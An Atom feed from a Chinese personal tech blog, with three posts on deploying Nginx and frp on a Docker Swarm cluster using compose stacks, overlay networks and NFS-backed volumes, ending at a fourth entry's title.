<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>R4y&#39;s Blog</title>
  
  <subtitle>个人回收站</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.diglp.xyz/"/>
  <updated>2019-03-15T01:27:26.571Z</updated>
  <id>https://blog.diglp.xyz/</id>
  
  <author>
    <name>R4yd</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>从Service到Stack</title>
    <link href="https://blog.diglp.xyz/2019/03/14/OP_Swarm_Stack/"/>
    <id>https://blog.diglp.xyz/2019/03/14/OP_Swarm_Stack/</id>
    <published>2019-03-13T16:00:00.000Z</published>
    <updated>2019-03-15T01:27:26.571Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>本来想着集群稳定呢，结果早上六点docker 的网络就突然挂了。默认网关除了问题，ping 外网不可达。导致远程主机域名无法解析，<code>8.8.4.4:53</code> 不可达，整体服务不可用。</p><p>这篇，接着上面的内容，实现 frp 和 Nignx 的服务的Stack 化。前面遇到的问题，后面在找个整体的时间进行解决吧。</p><h2 id="架构描述-以及-Compose实现"><a href="#架构描述-以及-Compose实现" class="headerlink" title="架构描述 以及 Compose实现"></a>架构描述 以及 Compose实现</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>这里主要是使用 frp 和 Nginx ，前者用于穿透，后者进行页面的反代。所以这里的就是两层的服务。应该还有一级提供负载均衡的server，不过Swarm 的本身已经提供了 VIP 以及负载均衡的功能。 </p><h3 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker-Compose"></a>Docker-Compose</h3><p>docker-compose 是用来做docker 的多容器控制，可以通过一个描述文件，来对服务，或者容器，进行整体的搭建，大大简化了操作流程以及可维护和可拓展性。这里的内容参考了网上的例子，进行了简单的修改。实现了前面所描述的架构。</p><p>具体的 <code>.yml</code> 文件如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.2"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  nginx:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80"</span><span class="comment"># 对外暴露端口</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">      - nginx_conf:</span><span class="string">/etc/nginx</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">      update_config:</span></span><br><span class="line"><span class="attr">        parallelism:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">        delay:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">      restart_policy:</span></span><br><span class="line"><span class="attr">        condition:</span> <span class="string">on-failure</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">  frp:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">xddxdd/frpc:arm32v7</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">     - frpc_ini:</span><span class="string">/frp</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">      update_config:</span></span><br><span class="line"><span class="attr">        parallelism:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">        delay:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">      restart_policy:</span></span><br><span class="line"><span class="attr">        condition:</span> <span class="string">on-failure</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">  backend:</span></span><br><span class="line"><span class="comment"># 这里是应该建立的卷</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="attr">  nginx_conf:</span> </span><br><span class="line"><span class="attr">    driver_opts:</span></span><br><span class="line"><span class="attr">      type:</span> <span class="string">"nfs4"</span></span><br><span class="line"><span class="attr">      o:</span> <span class="string">"addr=192.168.1.130,nolock,soft,rw"</span></span><br><span class="line"><span class="attr">      device:</span> <span class="string">":/srv/nfs/nginx/conf"</span></span><br><span class="line"><span class="attr">  frpc_ini:</span> </span><br><span class="line"><span class="attr">    driver_opts:</span>  </span><br><span class="line"><span class="attr">      type:</span> <span class="string">"nfs4"</span></span><br><span class="line"><span class="attr">      o:</span> <span class="string">"addr=192.168.1.130,nolock,soft,rw"</span></span><br><span class="line"><span class="attr">      device:</span> <span class="string">":/srv/nfs/frpc"</span></span><br></pre></td></tr></table></figure><p>一个好消息：在这种配置的情况下比较奇迹的是可以进行 <strong>NFS 的自动挂载</strong>了。解决了前面一个很大的问题。也不清楚是之前的BUG 还是什么情况。</p><blockquote><p>Compose下面使用nfs : <span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDUyODI2MDgvaG93LXRvLWRpcmVjdGx5LW1vdW50LW5mcy1zaGFyZS12b2x1bWUtaW4tY29udGFpbmVyLXVzaW5nLWRvY2tlci1jb21wb3NlLXYz" title="https://stackoverflow.com/questions/45282608/how-to-directly-mount-nfs-share-volume-in-container-using-docker-compose-v3">How to directly mount NFS share/volume in container using docker compose v3<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这里<strong>有一个坑</strong>。在Portainer 上面直接进行 Stack 部署的话，会有报错，说是平台不支持，但是的确是拉的arm的。报错信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">State Messagepending task scheduling</span><br><span class="line">Error messageno suitable node (unsupported platform on 3 nodes; 1 node not available for new tasks)</span><br></pre></td></tr></table></figure><p>查证之后，得到以下的回答</p><blockquote><p>参考链接 =  <span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDg5NjIzOTkvbm8tc3VpdGFibGUtbm9kZS11bmFibGUtdG8tZGVwbG95LWltYWdlLXVzaW5nLWRvY2tlci1zZXJ2aWNl" title="https://stackoverflow.com/questions/48962399/no-suitable-node-unable-to-deploy-image-using-docker-service">no suitable node - unable to deploy image using docker service<i class="fa fa-external-link"></i></span></p></blockquote><p>在命令行里进行创建，带一个 <code>--resolve-image never</code> 的参数，这样可以解决报错：<strong>镜像平台不支持的问题</strong> 但前提是，镜像的架构必须相同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stack deploy --compose-file str.yml --resolve-image never home</span><br></pre></td></tr></table></figure><h2 id="项目细节"><a href="#项目细节" class="headerlink" title="项目细节"></a>项目细节</h2><p>这里需要解决的问题，就是网络的问题。在前面的方法里面是直接把端口暴露在了 HOST 上面，这样占用主机资源显然是不符合<strong>容器化的思想</strong>。这里就使用Docker 的强大的网络功能，来实现一个真正的服务。swarm 的服务网络其自动带有了 负载均衡 以及 <strong>VIP</strong>。所以，这里实现目标就是 FRP 到 VIP的映射</p><h3 id="Stack的内部网络"><a href="#Stack的内部网络" class="headerlink" title="Stack的内部网络"></a>Stack的内部网络</h3><p>Swarm 的自建 Layout 网络默认的是VIP模式，可以inspect服务得到服务所在网络的VIP。这个服务，跑了 Nginx 镜像的多个副本。这些副本共用一个 VIP。实现了负载均衡以及高可用，当单容器挂了之后，自动的进行 IP 的漂移。</p><p>获取 service 的VIP 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker service  inspect nginxs</span><br><span class="line"></span><br><span class="line">"Endpoint": &#123;</span><br><span class="line">"Spec": &#123;</span><br><span class="line">"Mode": "vip"</span><br><span class="line">&#125;,</span><br><span class="line">"VirtualIPs": [</span><br><span class="line">        &#123;</span><br><span class="line">            "NetworkID": "ktsw8uaob2n0ppsh93p5upils",</span><br><span class="line">            "Addr": "10.0.14.9/24"</span><br><span class="line">        &#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于前面已经配置了，这个 Stack ，两个服务是在同一个子网（backend）中。所以 ，frp服务是和nginx 的网络是联通的。所以可以直接访问 其VIP。由于，好像使用stack了NFS 的问题自动解决了。这里直接修改主机上的配置文件即可。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@bgb0:/tmp# cat /srv/nfs/frpc/frpc.ini </span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = ****.****.xyz </span><br><span class="line"><span class="attr">server_port</span> = ****</span><br><span class="line"><span class="attr">token</span> = myfrptest</span><br><span class="line"><span class="section">[web_swarm]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">10.0</span>.<span class="number">14.9</span># 这里是 Nginx服务的VIP</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ****</span><br></pre></td></tr></table></figure><p>之后，更新该服务，重新加载配置。发现外网服务可达，已实现目标功能。开心</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82MGJjY2JkYjZhZjk=" title="https://www.jianshu.com/p/60bccbdb6af9">Docker Swarm 入门：Service Network 管理<i class="fa fa-external-link"></i></span> 通过这篇，对网络有了基本了解 （小姐姐好看）</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kYmE5MzQyMDcxZDg=" title="https://www.jianshu.com/p/dba9342071d8">Docker Swarm 服务发现和负载均衡原理<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5odWlsb2cuY29tLz9wPTEwMzg=" title="http://www.huilog.com/?p=1038">docker swarm 集群及多主机overlay网络测试<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9nYW5iaW5nLzIwOTEyOTI=" title="https://blog.51cto.com/ganbing/2091292">“三剑客”之Swarm应用数据持久化管理（volume 、bind 、 nfs）<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>构思基本已经实现了，一个基于容器技术的服务部署。后面，想着对系统的整体的日志监控，依旧使用前面的ELK。完成之后，算是项目收工，后面开始Golang了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;本来想着集群稳定呢，结果早上六点docker 的网络就突然挂了。默认网关除了问题，ping 外网不可达。导致远程主机域名无法解析，&lt;code&gt;8.8
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Docker" scheme="https://blog.diglp.xyz/tags/Docker/"/>
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
      <category term="Swarm" scheme="https://blog.diglp.xyz/tags/Swarm/"/>
    
  </entry>
  
  <entry>
    <title>Nginx 的 Swarm 化</title>
    <link href="https://blog.diglp.xyz/2019/03/13/OP_Swarm_nginx/"/>
    <id>https://blog.diglp.xyz/2019/03/13/OP_Swarm_nginx/</id>
    <published>2019-03-12T16:00:00.000Z</published>
    <updated>2019-03-13T14:52:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这个题目可能显得比较不严谨，但是也想不到什么好的名字。这篇主要就是实现，在一个 Swarm 集群里面的 Nginx 的服务部署。且实现可以很快的进行 文件变更以及配置变更的统一提交。</p><p>这里至于之前的对于Swarm 的服务功能的测试不同了，更加偏向应用。再往后一部分，<strong>将会使用stack</strong> 来实现一个真正可用的服务架构。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>使用Swarm 很容易的实现了一个服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker service create \</span><br><span class="line">--replicas 2 \# 两个副本（一共）</span><br><span class="line">--network ngx_net \ # 虚拟网络</span><br><span class="line">--name my-test \# 服务名</span><br><span class="line">-p 80:80 nginx# 端口映射（本地到容器）</span><br></pre></td></tr></table></figure><p>但是实际上要对这些服务进行以下内容的变更，就需要挂载<strong>外部卷</strong>了。</p><h3 id="外部卷的挂载"><a href="#外部卷的挂载" class="headerlink" title="外部卷的挂载"></a>外部卷的挂载</h3><p>在创建服务的时候，可以使用以下，命令进行 一个数据卷的创建，以及挂载。而且在服务被创建的时候，这些容器会被拷贝到多个节点上去，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个挂载卷</span><br><span class="line">docker volume create --name myvolume</span><br><span class="line"># 在容器内挂载卷</span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \</span><br><span class="line">--network ngx_net \</span><br><span class="line">--mount type=volume,src=myvolume,dst=/wangshibo \</span><br><span class="line">--name test-nginx nginx</span><br></pre></td></tr></table></figure><p>但是问题来了，如果部署完成之后，对配置文件进行变更，这文件并不会同步到每个节点上。这里打算使用 NFS 进行部署</p><h3 id="NFS-的部署"><a href="#NFS-的部署" class="headerlink" title="NFS 的部署"></a>NFS 的部署</h3><p>为了实现多节点的配置文件的同步，以及数据卷的统一管理，这里就直接使用NFS</p><p>使用 apt 直接进行服务的安装 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common # 这个在所有节点进行安装</span><br><span class="line">apt-get install nfs-kernel-server# 这里是NFS的服务，安装在服务节点上</span><br></pre></td></tr></table></figure><p>配置共享目录 <code>/etc/exports</code> ，添加新行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/srv/nfs/  bgb1(rw,sync)  bgb2(rw,sync)  bgb3(rw,sync)</span><br></pre></td></tr></table></figure><p>重启服务端的nfs服务，并且尝试挂载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> service nfs-kernel-server start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> b 主机上进行挂载</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> mount bgb0:/srv/nfs /mnt/</span></span><br></pre></td></tr></table></figure><hr><p>测试完成，NFS 部署完成。</p><h3 id="NFS-共享卷挂载"><a href="#NFS-共享卷挂载" class="headerlink" title="NFS 共享卷挂载"></a>NFS 共享卷挂载</h3><p>为了实现多个节点之间的文件共享。<strong>这里遇到了很坑的问题，不知道是自己的理解问题还是BUG什么，具体症状是 NFS卷 不进行自动的挂载</strong>。</p><p>新建一个NFS的卷，下面命令进行参数修改即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker volume create --driver local \</span><br><span class="line">--opt type=nfs4 \</span><br><span class="line">--opt o=addr=&lt;NFS-Server&gt;,rw \</span><br><span class="line">--opt device=:&lt;Shared-Path&gt; \</span><br><span class="line">share</span><br></pre></td></tr></table></figure><hr><p>由于上面的问题折腾了很久的时间，只好暂时使用手动进行挂载，后面再进行逐步的研究。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount bgb0:/srv/nfs /var/lib/docker/volumes/share/_data</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用作页面 /usr/share/nginx/html/</span></span><br><span class="line">mount bgb0:/srv/nfs/nginx/html /var/lib/docker/volumes/Nginx_html/_data</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用作配置 /etc/nginx/</span></span><br><span class="line">mount bgb0:/srv/nfs/nginx/conf /var/lib/docker/volumes/Nginx_conf/_data</span><br></pre></td></tr></table></figure><p>和第一部分的创建服务一样，这里直接使用Portainer来进行创建各个节点的卷，<strong>然后手动执行上面的命令，进行NFS的挂载，没有美感</strong></p><p>（应该又是一个 BUG ，在创建服务的时候初始配置，如果直接使用了当前的卷，其默认的的是新建新的卷。而不是对原有的卷来进行拷贝，这点待会可能去提个 Issue 。）<strong>需要在服务创建之后，后面进行第二次的挂载，才能正确的挂载 nginx_html 这个卷</strong></p><p>当全部进行手动挂载之后，所有的配置文件都可可以从NFS主机处获取。实现配置的统一管理</p><hr><p>记得映射 <strong>80 和 443</strong> 完成主机功能配置。</p><h3 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h3><p>当前面的基于 NFS 的共享配置完成之后，可以直接对之前的配置进行平行迁移即可，（copy-paste）。</p><p>完成配置文件的迁移之后，可以直接在终端里面进行平滑升级。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker service update WebTest</span><br></pre></td></tr></table></figure><h3 id="frpc-的部署"><a href="#frpc-的部署" class="headerlink" title="frpc 的部署"></a>frpc 的部署</h3><p>这里这里可以直接在 DockerHub上面找到相应的镜像，前面还以为没有，打算自己写 Dockerfile的，现在既然遇上了就直接使用了。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3hkZHhkZC9mcnBjL3RhZ3M=" title="https://hub.docker.com/r/xddxdd/frpc/tags">xddxdd/frpc<i class="fa fa-external-link"></i></span> 这个是 frpc 的image ，里面刚好有 armv7 的版本 。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry point/usr/bin/frpc</span><br><span class="line">working Dir/frp</span><br></pre></td></tr></table></figure><p>这里，直接 bind 绑定 host 的目录，到容器内部</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--mount type=bind,src=/conf,dst=/frp</span><br></pre></td></tr></table></figure><p>主机目录配置文件 <code>frpc.ini</code> ，其配内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = *******</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"></span><br><span class="line"><span class="section">[web_swarm]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.***.***</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ******</span><br></pre></td></tr></table></figure><p>之后直接对容器进行重启即可。</p><h3 id="后"><a href="#后" class="headerlink" title="后"></a>后</h3><p>这里是在云服务器上使用 Nginx 做一个 upstream ， 具体的细节前面有讲 不在赘述。至此功能测试完毕。</p><h2 id="续"><a href="#续" class="headerlink" title="续"></a>续</h2><p>后面将会使用 Stack 和 network 功能， 实现结构的整体部署。还得解决 NFS 的不自动挂载的问题</p><blockquote><p>是不是每个人年轻的时候都有这样一段日子，鸿鹄志高却难遂，迷茫地过着，昏昏噩噩地耗，最终不是妥协泯然众人，就是找不到出口被生活围困。这时候家人朋友，看在眼里，哪怕不说，心里想的也是“小镇青年何必心怀远方”这样的想法吧。（J·M·库切《青春》）</p></blockquote><p>### </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这个题目可能显得比较不严谨，但是也想不到什么好的名字。这篇主要就是实现，在一个 Swarm 集群里面的 Nginx 的服务部署。且实现可以很快的进行
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Docker" scheme="https://blog.diglp.xyz/tags/Docker/"/>
    
      <category term="Nginx" scheme="https://blog.diglp.xyz/tags/Nginx/"/>
    
      <category term="Swarm" scheme="https://blog.diglp.xyz/tags/Swarm/"/>
    
  </entry>
  
  <entry>
    <title>Swarm的服务</title>
    <link href="https://blog.diglp.xyz/2019/03/12/OP_Swarm_%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8/"/>
    <id>https://blog.diglp.xyz/2019/03/12/OP_Swarm_集群使用/</id>
    <published>2019-03-11T16:00:00.000Z</published>
    <updated>2019-03-12T14:22:19.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>上一篇简单快速的进行swarm集群的部署，这可以开始使用了。这里试着部署一个 Nginx 的服务，并且一步步实现前面的高可用的服务架构。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL25naW54" title="https://hub.docker.com/_/nginx">Nginx image 地址<i class="fa fa-external-link"></i></span></p></blockquote><p>这里推荐一个博客：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS8=" title="https://www.cnblogs.com/kevingrace/">散尽浮华 - 安寻安放，不卑不亢；重剑无锋，大巧不工！<i class="fa fa-external-link"></i></span></p></blockquote><p>里面很多很多的干活，实用型的文章</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><p>多个容器的统一为服务</p></li><li><p>多个服务的统一为栈</p></li><li><p>服务内自动有VIP机制，VIP 为各个节点的IP</p></li><li><blockquote><p>docker service其实不仅仅是批量启动服务这么简单，而是在集群中定义了一种状态。Cluster会持续检测服务的健康状态并维护集群的高可用性。</p></blockquote></li></ul><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Swarm 作为 Docker 的原生功能，其主要的工具有以下：</p><ul><li>docker swarm 用于集群管理</li><li>docker service 用于服务创建</li><li>docker node 用于节点管理</li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="部署服务"><a href="#部署服务" class="headerlink" title="部署服务"></a>部署服务</h3><p>这里简单的基于 Swarm 部署一个 Nginx 的服务。（其实这里本来应该有详细的说明的，留在下篇吧）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker network create -d overlay ngx_net</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看docker网络</span></span><br><span class="line">docker network ls</span><br><span class="line"></span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \# 两个副本（一共）</span><br><span class="line">--network ngx_net \ # 虚拟网络</span><br><span class="line">--name my-test \# 服务名</span><br><span class="line">-p 80:80 nginx# 端口映射（本地到容器）</span><br><span class="line"></span><br><span class="line">docker service ps# 查看运行的所有的服务</span><br><span class="line"></span><br><span class="line">docker ps# 查看节点的运行的容器</span><br></pre></td></tr></table></figure><h3 id="服务扩缩容"><a href="#服务扩缩容" class="headerlink" title="服务扩缩容"></a>服务扩缩容</h3><p>Swarm 的一大亮点，就是可以很灵活的进行服务的扩缩容。可以很方便的调整服务的对应的容器的数量。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker service scale my-test=1</span><br><span class="line">docker service scale my-test=5</span><br></pre></td></tr></table></figure><h3 id="数据的持久化"><a href="#数据的持久化" class="headerlink" title="数据的持久化"></a>数据的持久化</h3><p>容器和镜像的区别在与其可读性，镜像可以理解为只读的容器。为了数据的持久化，数据应该挂在在硬盘之上，而不是容器智能，否则容器销毁，数据将会消失。</p><p>这里主要有两种办法：</p><ul><li>bind        这里是直接绑定硬盘上的目录和容器内的目录。</li><li>volumes    在主机上建立相应的目录，可以进行统一的管理。</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个挂载卷</span></span><br><span class="line">docker volume create --name myvolume</span><br><span class="line"><span class="meta">#</span><span class="bash"> 在容器内挂载卷</span></span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \</span><br><span class="line">--network ngx_net \</span><br><span class="line">--mount type=volume,src=myvolume,dst=/wangshibo \</span><br><span class="line">--name test-nginx nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里在容器内执行shell，可以看到文件已经同步</span></span><br><span class="line">docker exec -ti 3618e3d1b966 /bin/bash</span><br></pre></td></tr></table></figure><hr><p>这里再折腾的时候，遇到了很大的问题，后面看到发现是swarm 的特性。当服务有多个副本的时候，在创建的时候，的确会在manager界面对目录进行拷贝。但是，后续再对manager上的文件进行修改，这些修改将不会被同步到各个节点上。需要一个个的进行修改很是麻烦，后面可以试着使用 <strong>NFS</strong> 实现多个镜像的配置文件的统一。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzY4NzAzNTkuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6870359.html">Docker管理工具-Swarm部署记录<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><blockquote><p>当你发现自己的才华撑不起野心时，就请安静下来学习吧</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;上一篇简单快速的进行swarm集群的部署，这可以开始使用了。这里试着部署一个 Nginx 的服务，并且一步步实现前面的高可用
      
    
    </summary>
    
      <category term="OP之路" scheme="https://blog.diglp.xyz/categories/OP%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Docker" scheme="https://blog.diglp.xyz/tags/Docker/"/>
    
      <category term="Swarm" scheme="https://blog.diglp.xyz/tags/Swarm/"/>
    
  </entry>
  
  <entry>
    <title>Docker集群搭建</title>
    <link href="https://blog.diglp.xyz/2019/03/05/OP_Docker_Swarm/"/>
